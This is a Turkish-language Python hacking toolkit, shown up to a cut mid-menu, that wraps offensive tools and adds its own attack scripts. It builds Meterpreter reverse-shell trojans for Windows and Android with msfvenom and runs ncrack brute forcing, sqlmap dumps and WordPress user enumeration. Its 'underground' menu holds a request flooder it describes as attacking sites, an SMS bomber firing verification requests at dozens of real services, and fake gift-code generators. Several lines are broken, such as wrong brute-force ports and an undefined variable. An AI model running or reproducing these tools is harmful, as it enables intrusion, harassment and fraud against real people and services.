#!/usr/bin/env python
import os
import py_compile
import random 
import hashlib
import socket
import urllib.request
import urllib.parse
srum = open("surum.txt")
surum = srum.read()
os.system("apt-install figlet")
os.system("apt-install chkrootkit")
os.system("clear")
import acilis
sexettinsecim = input("Seçiminizi yazınız > ")

if(sexettinsecim=="1"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	anahtarkelime = input("Anahtar Kelime Girin: ")
	os.system("searchsploit " + anahtarkelime)

	istek = input("Yeni arama yapmak ister misiniz? (y/n): ")

	if(istek =="y"):
		os.system("python3 sexettintoolsv"+surum+".py")
	elif(istek =="n"):
		print("Görev sonlandırıldı")

	


elif(sexettinsecim=="2"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Güvenlik Duvarı Tespit Etme Aracına Hoş Geldin

	''')


	guvenliksite = input("Site Adresini Girin: ")
	os.system("wafw00f " + guvenliksite)


elif(sexettinsecim=="3"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''
Kaba Kuvvet Aracına Hoş Geldiniz

1-) FTP
2-) SSH
3-) TELNET
4-) HTTP
5-) SMB
6-) RDP
7-) SIP
8-) REDİS
9-) VNC
10-) PostgreSQL
11-) SQL

''')


	islemno = input("İşlem Numarasını Giriniz: ")
	hedefip = input("Hedef Ip Giriniz: ")
	kadi = input("Kullanıcı Adı Dosya Yolu: ")
	sifre = input("Şifrelerin Bulunduğu Dosya Yolu: ")

	if(islemno=="1"):
		os.system("ncrack -p 21 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="2"):
		os.system("ncrack -p 22 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="3"):
		os.system("ncrack -p 23 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="4"):
		os.system("ncrack -p 24 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="5"):
		os.system("ncrack -p 25 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="6"):
		os.system("ncrack -p 26 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="7"):
		os.system("ncrack -p 27 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="8"):
		os.system("ncrack -p 28 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="9"):
		os.system("ncrack -p 29 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="10"):
		os.system("ncrack -p 30 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="11"):
		os.system("ncrack -p 31 -u " + kadi + " -P " + sifre + " " + hedefip)
	else:
		print("Hatalı seçim yaptın >:(")



elif(sexettinsecim=="4"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Port Tarama")
	print('''



Port Tarama Aracına Hoşgeldin

1-) Hızlı Tarama

2-) Servis ve Versiyon Bilgisi

3-) İşletim Sistemi Bilgisi


''')



	islemno = input("İşlem Numarasını Girin: ")
	if(islemno=="1"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system=("nmap " +hedefip)

	elif(islemno=="2"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -sS -sV " +hedefip)

	elif(islemno=="3"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -O " +hedefip)


	else:
		print("Hatalı seçim yaptınız")



elif(sexettinsecim=="5"):
	os.system("apt-get install chkrootkit")
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Rootkit Tarama Aracına Hoş Geldiniz!


''')
	try:
		os.system("chkrootkit")
	except:
		print("chkrootkit bulunamadı. Aracı kök kullanıcısı olarak tekrar çalıştırın. İşe yaramazsa 'sudo apt install chkrootkit' komutunu kullanıp kök kullanıcı olarak (root) tekrar programı çalıştırın")

elif(sexettinsecim=="6"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Trojan Oluşturma Aracına Hoş Geldiniz

	''')

	ip = input("Local veya Dış Ip Adresi Giriniz: ")
	port = input("Port Girin: ")
	print('''
1-) windows/meterpreter/reverse_tcp
2-) windows/meterpreter/reverse_http
3-) windows/meterpreter/reverse_https
4-) android/meterpreter/reverse_tcp 
5-) android/meterpreter/reverse_http
6-) android/meterpreter/reverse_https
	''')
	payload = input("Payload No Giriniz: ")
	kayityeri = input("Kayıt Yerini Giriniz: ")

	if(payload=="1"):
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="2"):
		os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="3"):
		os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="4"):
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="5"):
		os.system("msfvenom -p android/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="6"):
		os.system("msfvenom -p android/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	else:
		print("Hatalı Seçim Yaptınız")
	
elif(sexettinsecim=="7"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")

	print('''

Zaafiyet Analizi Aracına Hoş Geldiniz
1 - Temel Tarama
2 - Port Numarası ile Tarama
3 - Görüntüleme Seçenekleri ile Tarama
4 - Verileri Kayıt Ederek Tarama
	''')
	hedefzaafiyetip = input("Hedef ip giriniz: ")
	secim_7 = input("Seçiminizi giriniz:")
	if secim_7 == "1":
		os.system("nikto -h " +hedefzaafiyetip)
	if secim_7 == "2":
		port_7 = input("Port numarası giriniz:")
		os.system("nikto -h " +hedefzaafiyetip+" -p "+port_7)
	if secim_7 == "3":
		port_7 = input("Port numarası giriniz:")
		print("Görüntüleme seçeneğinin ne olduğunu bilmiyorsanız başka bir terminalde 'nikto -h' komutunu çalıştırabilirsiniz.")
		display_7 = input("Görüntüleme seçeneği giriniz:")
		os.system("nikto -h " +hedefzaafiyetip+" -p "+port_7+" -display "+display_7)
	if secim_7 == "4":
		print("""Kaydetme seçenekleri:
csv
html
nbe
sql
txt
xml""")
		kaydetme_secenek = input("Kaydetme seçeneğini yazınız:")
		os.system("nikto -h " +hedefzaafiyetip+" -o "+kaydetme_secenek)


elif(sexettinsecim=="8"):
	os.system("apt-get install figlet")
	os.system("apt-get install lynis")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Hoş geldiniz Zaafiyet analizi v2 aracı başlatılıyor...
	''')
	print('''

ANALİZ SONUCU

	''')
	os.system("lynis audit system")


elif(sexettinsecim=="9"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

En Kısa Yoldan Wordlist Oluşturma Aracı


''')
	minc = input("Minimum kaç haneli olsun? ")
	maxc = input("Maximum kaç haneli olsun? ")
	icindekikelime = input("İçinde hangi kelimeler/rakamlar bulunsun? ")
	dosyaadic = input("Dosyanın adı ne olsun? (uzantısı ile beraber yazınız) ")
	os.system("crunch "+minc+" "+maxc+" "+icindekikelime+" -o "+dosyaadic)

elif(sexettinsecim=="10"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Vpn Kontrol Aracına Hoş Geldiniz!

''')

	vpnhedefip = input("Hedef Ip Giriniz > ")
	os.system("ike-scan "+vpnhedefip)




elif(sexettinsecim=="11"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

MAC Adresi Değiştirme Aracına Hoş Geldiniz!

1-) Mac Adresini Random Belirle

2-) Mac Adresini Kendin Belirle

3-) Mac Adresini Orjinale Döndür

	''')

	macislem = input("İşlem Numarasını Yazınız > ")
	if(macislem=="1"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -r eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi random belirlendi!]")


	elif(macislem=="2"):
		macadres = input("Yeni Mac Adresini Giriniz > ")
		os.system("ifconfig eth0 down")
		os.system("macchanger --mac "+macadres+" eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi elle belirlendi!]")


	elif(macislem=="3"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -p eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mMac Adresi Orjinale Döndürüldü!]")
	else:
		print("Hatalı Seçim Yaptınız")
	


elif(sexettinsecim=="12"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

WORDPRESS Tarama Aracı

1-) Hızlı Tarama

2-) Eklenti Tarama

3-) Tema Tarama 

4-) Yönetici Kullanıcı Adı Tarama

	''')

	wpislem = input("İşlem Numarası Giriniz > ")

	if(wpislem=="1"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp)
	elif(wpislem=="2"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate p")
	elif(wpislem=="3"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate t")
	elif(wpislem=="4"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate u")

	else:
		print("Hatalı Seçim Yaptınız")



elif(sexettinsecim=="13"):

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Derleme Aracına Hoş Geldiniz!

	''')

	derle = input("Program Yolunu Giriniz > ")

	py_compile.compile(derle)
	print("Derlenen program .pyc uzantılı bir şekilde oluşturuldu. Ana veya da pycache klasörünü kontrol ediniz.")



elif(sexettinsecim=="14"):

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")

	print('''

1-) Açıklı Siteyi Biliyorum

2-) Açıklı Site ve Veritabanı Adını Biliyorum

3-) Açıklı Siteyi Veritabanı Adını ve Tablo Adını Biliyorum

örnek link: http://www.suesupriano/article.php?id=25

	''')

	sqlsecim = input("Seçim yapınız > ")
	if(sqlsecim=="1"):
		aciklilink = input("site gir")
		os.system("sqlmap -u "+aciklilink+" --dbs --random-agent")

	elif(sqlsecim=="2"):
		aciklilink = input("Açıklı siteyi girin > ")
		averitabani = input("veritabanı Adını Giriniz > ")
		os.system("sqlmap -u "+aciklilink+" -D "+averitabani+" --tables --random-agent")


	elif(sqlsecim=="3"):
		aciklilink = input("Açıklı siteyi girin > ")
		averitabani = input("veritabanı Adını Giriniz > ")
		tablo = input("Tablo Adını Giriniz > ")
		os.system("sqlmap -u "+aciklilink+" -D "+averitabani+" - T "+tablo+" --columns --random-agent")


	

	else:
		print("Hatalı Seçim Yaptınız")



elif(sexettinsecim=="15"):
	r1 = "\033[91m"  # Kırmızı
	r2 = "\033[92m"  # Yeşil
	r3 = "\033[93m"  # Sarı
	r4 = "\033[94m"  # Mavi
	r5 = "\033[95m"  # Mor
	r6 = "\033[96m"  # Camgöbeği
	r7 = "\033[97m"  # Beyaz
	r9 = "\033[31m"  # Koyu kırmızı
	r10 = "\033[32m" # Koyu yeşil
	r11 = "\033[33m" # Koyu sarı
	r12 = "\033[34m" # Koyu mavi
	r13 = "\033[35m" # Koyu mor
	r14 = "\033[36m" # Koyu camgöbeği
	r15 = "\033[37m" # Koyu beyaz

	rengo2 = [r1, r2, r3, r4, r5, r6, r7, r9, r10, r11, r12, r13, r14, r15]

	renkki2 = random.choice(rengo2)
	os.system("apt-get install figlet")
	os.system("clear")
	print(renkki2)
	print('''
            .-.____________________.-.
     ___ _.' .-----.    _____________|
    /_._/   (      |   /_____________|
      /      `  _ ____/     
     |_      .\(  ||      ____                _   _   _       _         
    .'  `-._/__`_//      / ___|  _____  _____| |_| |_(_)_ __ (_)_ __  
  .'       |             \___ \ / _ \ \/ / _ \ __| __| | '_ \| | '_ \ 
 /        / 		 _ __) |  __/>  <  __/ |_| |_| | | | | | | | |
/        | 		 |____/ \___/_/\_\___|\__|\__|_|_| |_|_|_| |_|
|        '   
|         \		                      _ _   ___     ___ 
`-._____.-'		 _   _  ___ _ __ __ _| | |_|_ _|___|_ _|
			| | | |/ _ \ '__/ _` | | __|| |/ __|| |
			| |_| |  __/ | | (_| | | |_ | |\__ \| | 
			 \__, |\___|_|  \__,_|_|\__|___|___/___|
			 |___/ 

YERALTINA HOŞ GELDİNİZ 


1-) Etkinleştirme Kodu Oluşturucuları

2-) Şifre Oluşturucu

3-) Şifre Oluşturucu v2

4-) Kullanıcı Adı ile Hesap Bulma (Statik)

5-) T¢ Son 2 Hane Bulma 

6-) An0nimSMS (Hata alanlar vpn ile denesin)

7-) Telefon Numarasından Şehir Bulma (TR deaktif)

8-) Panelsiz Mail (Statik)

9-) Admin Panel Tara (Statik)

10-) Spambot

11-) Ip Adresinden Bilgi Topla

12-) UltraBot

13-) Oto tıklayıcı

14-) Sms Bomb

15-) Zip Şifre Kırıcı

16-) Wordlist Oluşturucu

17-) Oltalama Araçları

18-) Instagram Bot

19-) Sitedeki Linkleri Çekme

20-) Sitedeki Yazıları Çekme

21-) Sitedeki Resim Yollarını Çekme

22-) Dosyalar Arası Veri Karşılaştırma

23-) StnCrypt

24-) Dosya İçerisinde Arama İşlemleri (Linux)

25-) Admin Panel Bulucu (Dinamik)

26-) Link Kısaltma Servisleri

27-) Whois Sorgulama

28-) SSL Analizi

29-) Rastgele İnsan Verisi Üret

30-) Rastgele İnsan Gönderisi Üret

31-) Dns Bilgi Toplama

32-) ISBN Numarasından Bilgi Toplama

33-) Mailin Geçerliliğini Kontrol Etme

34-) Ip Adresi Zafiyet Analizi

35-) SSH Brute Force

36-) Wifi Port Tarayıcı

37-) Anormal DNS Tespit Edici

38-) Dns Yönlendirici

39-) Wifi Dinleyicisi 1

40-) Wifi Dinleyicisi 2

41-) Ana Menüye Dön

	''')
	yeraltisecim = input("Sizi Nereye Alayım? ")
	if(yeraltisecim=="1"):
		print('''Uyarı: Oluşturulan kodların çalışma ihtimali çok düşüktür. Bu kodları bir otomasyon aracına bağlayarak daha kolay şekilde deneyebilirsiniz. 

Seçim Menüsü
1-) Dic0rd nitro generator

2-) G00gle pIay kod generator

3-) P3bg u¢ generator

4-) P3bg u¢ generatorv2 

5-) P3bg u¢ generatorv3 

6-) P3bg u¢ generatorv4

7-) P3bg u¢ generatorv5''')
		secim_generator = input("Seçiminizi giriniz:")
		if secim_generator == "1":
			chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

			while 1:
				password_sayi = int(input("Kaç tane oluşturulsun? "))
				for x in range(0,password_sayi):
					password = ""
					for x in range(16):
						password_sayi = random.choice(chars)
						password	= password + password_sayi
					print("discord.gift/"+password)
		if secim_generator == "2":
			chars = "ABCDEFGHIJKLMNOPRSTUVYQW1234567890"

			while 1:
				password_sayi = int(input("Kaç tane oluşturulsun? "))
				for x in range(0,password_sayi):
					password = ""
					for x in range(16):
						password_sayi = random.choice(chars)
						password	= password + password_sayi
					print(password)

		if secim_generator == "3":

			chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

			while 1:
				password_sayi = int(input("Kaç tane oluşturulsun? "))
				for x in range(0,password_sayi):
					password = ""
					for x in range(18):
						password_sayi = random.choice(chars)
						password	= password + password_sayi
					print(password)

		if secim_generator == "4":
			chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

			while 1:
				password_sayi = int(input("Kaç tane oluşturulsun? "))
				for x in range(0,password_sayi):
					password = ""
					for x in range(16):
						password_sayi = random.choice(chars)
						password	= password + password_sayi
					print("eKkVp-"+password)

		if secim_generator == "5":
			chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

			while 1:
				password_sayi = int(input("Kaç tane oluşturulsun? "))
				for x in range(0,password_sayi):
					password = ""
					for x in range(13):
						password_sayi = random.choice(chars)
						password	= password + password_sayi
					print("rHira"+password)
		if secim_generator == "6":
			chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

			while 1:
				password_sayi = int(input("Kaç tane oluşturulsun? "))
				for x in range(0,password_sayi):
					password = ""
					for x in range(13):
						password_sayi = random.choice(chars)
						password	= password + password_sayi
					print("pT42C"+password)


		if secim_generator == "7":
			chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

			while 1:
				password_sayi = int(input("Kaç tane oluşturulsun? "))
				for x in range(0,password_sayi):
					password = ""
					for x in range(13):
						password_sayi = random.choice(chars)
						password	= password + password_sayi
					print("RJNsK"+password)
		else:
			print("Geçersiz seçim")
	elif(yeraltisecim=="2"):
		import random 


		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890.!+-"

		while 1:
			password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
			password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(0,password_uzunluk):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("Senin için oluşturduğum şifre :" , password)

	elif(yeraltisecim=="3"):
		import random 


		chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")
		while 1:
			password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
			password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(0,password_uzunluk):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("Senin için oluşturduğum şifre :" , password)

	elif(yeraltisecim=="4"):
		hesapbul = input("Kullanıcı Adı Giriniz > ")
		print("")
		print("\033[92mFACEBOOK >  ","https://www.facebook.com/"+hesapbul)
		print("")
		print("INSTAGRAM >  ","https://www.instagram.com/"+hesapbul)
		print("")
		print("TWITTER >  ","https://www.twitter.com/"+hesapbul)
		print("")
		print("YOUTUBE >  ","https://www.youtube.com/"+hesapbul)
		print("")
		print("BLOGGER >  ","https://"+hesapbul+".blogspot.com")
		print("")
		print("REDDIT >  ","https://www.reddit.com/user/"+hesapbul)
		print("")
		print("GITHUB >  ","https://www.github.com/"+hesapbul)
		print("")
		print("STEAM >  ","https://steamcommunity.com/id/"+hesapbul)
		print("")
		print("VK >  ","https://vk.com/"+hesapbul)
		print("")
		print("SPOTIFY >  ","https://open.spotify.com/user/"+hesapbul)
		print("")
		print("WATTPAD >  ","https://www.wattpad.com/user/"+hesapbul)
		print("")
		print("WORDPRESS >  ","https://"+hesapbul+".wordpress.com")
		print("")
		print("PINTEREST >  ","https://www.pinterest.com/"+hesapbul)
		print("")
		print("TUMBLR >  ","https://"+hesapbul+".tumblr.com")
		print("")
		print("FLICKR >  ","https://www.flickr.com/people/"+hesapbul)
		print("")
		print("SOUNDCLOUD >  ","https://soundcloud.com/"+hesapbul)
		print("")


	elif(yeraltisecim=="5"):
		tcno = input("TC Kimlik No İlk 9 Hanesini Giriniz: ")
		a, b, toplamDokuz = 0, 0, 0
		for i in range(9):
		    toplamDokuz = toplamDokuz+int(tcno[i])
		    if i%2 == 0:
		        a = a+7*int(tcno[i])
		    elif i%2 == 1:
		        b = b+int(tcno[i])
		    if i == 8:
		        haneOn = (a-b)%10
		        haneOnBir = (haneOn+toplamDokuz)%10
		        print(tcno+str(haneOn)+str(haneOnBir))

	elif(yeraltisecim=="6"):
		os.system("pip install requests")
		import requests
		print("Not: Bu servis bazı ülkelerde devre dışı bırakıldı. Yurt dışı numaralarına anonim sms gönderebilirsiniz.")
		print("Günlük 1 mesaj hakkınız vardır numarayı +9055555555555 şeklinde giriniz link koymak yasak karakter sınırı düşüktür")
		telefonno = input("Telefon Numarası Giriniz : ")
		mesaj = input("Mesajınızı Giriniz: ")

		resp = requests.post('https://textbelt.com/text', {
  			'phone': telefonno,
  			'message': mesaj,
  			'key': 'textbelt',
		})
		print(resp.json())


	elif(yeraltisecim=="7"):
		import phonenumbers
		from phonenumbers import geocoder
		numara = input("Numara giriniz +90xxx şeklinde: ")
		telno = phonenumbers.parse(numara)
		print(geocoder.description_for_number(telno,"tr"))

	elif(yeraltisecim=="8"):
		import string
		var1 = ("@hotmail.com","@autlook.com","@gmail.com","@isecv.com","@dkt1.com","@rphinfo.com","@sc2hub.com","@firemailbox.club","@upimagine.com","@githabs.com","@tribalks.com","@vmani.com","@irezavh.com","",)
		var2 = ("xowason758","j.a.v.ierfran.ci.s.c.otmp","nineti5328","sdhumd4pik","nijraea423da","mkdare3092","kajiore441","pzadek544","pidora9832","xydg6mltfq","clgbqs47md","ugasaie232d","njfaf453t","42dadwr3r3","gerritc91","kyri771","sabo432","hesaplzaim45","noobels76","hda32dae3","hafeh10084","wifave8166","yovoc23640","hsabial394","rafe42esz","edbadaw45","daosan2142","fcafete4217","dafeka323a","gafwe23fa","braianmax4232")
		import random
		mail = random.choice(var1)
		kelimeler = random.choice(var2)
		print("\n Tek kullanımlık panelsiz mail. İlk deneyişte kabul etmezse bir daha üretebilirsiniz")
		print("||||||||||||||||||||||||||||||||||")
		print("\n"+kelimeler+mail+"\n")
		print("||||||||||||||||||||||||||||||||||")

	elif(yeraltisecim=="9"):
		url = input("Url giriniz > ")
		print("")
		print("\033[92mAlttaki linklerden biri panel olabilir")
		print("")
		print(url+"/admin.php") 
		print("")
		print(url+"/admin.html")
		print("")
		print(url+"/administrator")
		print("")
		print(url+"/admin")
		print("")
		print(url+"/adminpanel")
		print("")
		print(url+"/cpanel")
		print("")
		print(url+"/login")
		print("")
		print(url+"/wp-login.php")
		print("")
		print(url+"/admins")
		print("")
		print(url+"/logins")
		print("")
		print(url+"/admin.asp")
		print("")
		print(url+"/adm")
		print("")
		print(url+"/admin/account.html")
		print("")
		print(url+"/admin/login.html")
		print("")
		print(url+"/admin/login.htm")
		print("")
		print(url+"/admin/controlpanel.html")
		print("")
		print(url+"/admin.htm")
		print("")
		print(url+"/admin/controlpanel.htm")
		print("")
		print(url+"admin/adminLogin.html")
		print("")
		print(url+"admin/adminLogin.htm")
		print("")

	elif(yeraltisecim=="10"):
		os.system("pip install pyautogui")
		os.system("python3 spambot.py")

	elif(yeraltisecim=="11"):
		import urllib.parse
		import urllib.request
		import os


		ip = input("Ip giriniz > ")
		son = ("http://ip-api.com/json/"+ip)
		son2 = ("https://api.iplocation.net/?ip="+ip)
		print("\n SONUÇ: \n")
		urllib.request.urlretrieve(son, "sonuc.json")
		import json
		yazilmis = open("sonuc.json")
		jsonveri = yazilmis.read()
		veriler = json.loads(jsonveri)
		print("Durum: "+veriler["status"])
		print("Ülke: "+veriler["country"])
		print("Ülke Kodu: "+veriler["countryCode"])
		print("Bölge Numarası: "+veriler["region"])
		print("Şehir: "+veriler["city"])
		print("Posta Kodu: "+veriler["zip"])
		print("Saat Dilimi: "+veriler["timezone"])
		print("İnternet Sağlayıcısı: "+veriler["isp"])
		print("Lat: "+str(veriler["lat"]))
		print("Lon: "+str(veriler["lon"]))
		print("Org: "+veriler["org"])
		print("As: "+veriler["as"])
		print("Hedef: "+veriler["query"])
		print("\n ------------------Json verileri------------------ \n \n"+jsonveri)
		os.system("rm -rf sonuc.json")

	elif(yeraltisecim=="12"):
		import urllib.request
		import threading
		import time
		header_kodlarım = {
		    'User-Agent' : 'Mozilla/5.0 (Machintosh; sexettintool X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) Sexettintool/48.0.2564.116 ultrabot/537.36'}
		print("Bu bot arkaplanda belirtilen siteye sizin cihazınızdan art arda onlarca giriş yaparak siteye saldırır. Görüntüleme hilesi oluşturmak için de kullanılabilir. Aracın hiçbir programı için sorumluluk kabul edilmez.")
		site_adresi = input("Site adresi giriniz > ")
		site_adresi2 = site_adresi
		istek = urllib.request.Request(site_adresi, headers= header_kodlarım)
		istek2 = urllib.request.Request(site_adresi2, headers= header_kodlarım)
		istek3 = urllib.request.Request(site_adresi, headers= header_kodlarım)
		istek4 = urllib.request.Request(site_adresi, headers= header_kodlarım)
		istek5 = urllib.request.Request(site_adresi, headers= header_kodlarım)
		dos = urllib.request.urlopen(istek)
		for i in range(1,5):
		    html = urllib.request.urlopen(istek)
		    print("başarılı, devam ediyorum.")
		    time.sleep(5)
		    for i in range(1,4):
		        urllib.request.urlopen(istek2)
		        urllib.request.urlopen(istek3)
		        print("başarılı, devam ediyorum.")
		        time.sleep(10)
		        for i in range(1,3):
		            t1 = threading.Thread(target=dos)
		            t1.start()



	elif(yeraltisecim=="13"):
		os.system("pip install pynput")
		os.system("python3 ototikla.py")

	elif(yeraltisecim=="14"):
		import requests
		import urllib.request
		import time
		
		from json import dumps
		print("\nTam çalışmayabilir. Sorumluluk kabul edilmez.")
		num = input("Sms bomb için numara gir (+905555555555 şeklinde) ")
		phone = num
		cellphone = num[3:]
		headerler = {
			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) SxTOOL/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36'}

	
		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=tr&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))
		except:
			print("Başarısız")


		try:
			print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': num}))
		except:
			print("Başarısız")

		try:
 		       print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': num}))
		except:
			print("Başarısız")


		try:
			print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":num}))
		except:
			print("Başarısız")


		try:
        		print(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': num}))
		except:
			print("Başarısız")

		try:
        		print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers=headerler))
		except:
			print("Başarısız")

		try:
			requests.post(f"https://findclone.ru/register?phone=+{phone}")
		except:
			print("Başarısız")

		try:
			requests.post(f"https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number={phone}")
		except:
			print("Başarısız")
		try:
			requests.post(f"https://api.eldorado.ua/v1/sign?login={phone}&step=phone-check&fb_id=null&fb_token=null&lang=ru")
		except:
			print("Başarısız")
		try:
			requests.post(f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}")
			print("Başarılı")
		except:
			print("Başarısız")
		try:
			requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
			print("Başarılı")
		except:
			print("Başarısız")
		try:
			requests.post(f"https://www.oyorooms.com/api/pwa/generateotp?phone=+{phone}&country_code=%2B7&nod=4&locale=en")
			print("Başarılı")
		except:
			print("Başarısız")
		try:
			requests.post(f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}")
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://3040.com.ua/taxi-ordering', data={'callback-phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://alfalife.cc/auth.php', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://pampik.com/callback', data={'phoneCallback': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://city24.ua/personalaccount/account/registration', data={'PhoneNumber': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://my.dianet.com.ua/send_sms/', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://vladimir.edostav.ru/site/CheckAuthLogin', data={'phone_or_email': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://www.finam.ru/api/smslocker/sendcode', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://friendsclub.ru/assets/components/pl/connector.php', data={'phone': num, 'casePar':'authSendsms'})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://helsi.me/api/healthy/accounts/login', data={'phone': num,'platform':'PISWeb'})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://api.imgur.com/account/v1/phones/verify', data={'phone_number': num, 'region_code':'TR'})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://izi.ua/api/auth/sms-login', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://kaspi.kz/util/send-app-link', data={'adress': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://koronapay.com/transfers/online/api/users/otps', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://loany.com.ua/funct/ajax/registration/code', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://pizzasinizza.ru/api/phoneCode.php', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")

		try:
			requests.post('https://sayoris.ru/?route=parse/whats', data={'phone': num})
			print("Başarılı")
		except:
			print("Başarısız")



	elif(yeraltisecim=="15"):
		print("\033[92m")
		os.system("clear")
		print('''
     .--------.
    / .------. 
   | |        
  _| |________| |_
.' |_|        |_| '. Wordlistiniz var mı? 
'._____ ____ _____.'
|     .'____'.     | (Yok seçeneği işaretlenirse program sizin için oluşturacak)
'.__.'.'    '.'.__.'
'.__  |Sxtool|  __.| 1-) Wordlistim var
